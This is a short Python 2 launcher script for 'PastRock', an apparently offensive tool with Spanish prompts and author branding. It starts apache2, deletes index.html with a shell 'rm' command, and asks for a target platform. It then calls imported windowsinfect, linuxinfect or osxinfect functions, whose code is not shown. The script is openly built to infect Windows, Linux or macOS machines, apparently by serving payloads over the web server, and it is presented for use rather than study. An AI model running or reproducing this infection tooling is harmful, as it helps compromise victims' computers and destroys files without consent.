#!/usr/bin/python
#-*- coding: utf-8 -*-
import os
from linux import linuxinfect
from windows import windowsinfect
from osx import osxinfect

print chr(27)+"[3;36m"+"""
[---]        		   PastRock                    [---]
[---]        Created by: Andrés Montoya (SpyRock)      [---]
[---]                    Version: 0.2                  [---]
[---]         		  SpyRock SEC         	       [---]
[---]        Sigueme en Facebook: SpyRock SEC          [---]
[---]        Google plus: Andrés Montoya               [---]    
[---]       Homepage: http://spyrockos.aegae.com       [---]

              Visit: http://spyrockos.aegae.com
"""
print chr(27)+"[0;36m"+"[x]apache2 start..."

os.system("service apache2 start")

print chr(27)+"[0;36m"+"[:)]apache esta corriendo!"

print "[*]Limpiando..."

os.system("rm index.html")

plataforma=int(raw_input("""
Eliga plataforma

[1]Windows
[2]Linux
[3]MAC OSX (Pronto)

plataforma: """))

if (plataforma == 1):
	windowsinfect()
elif (plataforma == 2):
	linuxinfect()
elif (plataforma == 3):
	osxinfect()
else:
	print "A la proxima, escribe lo que es."
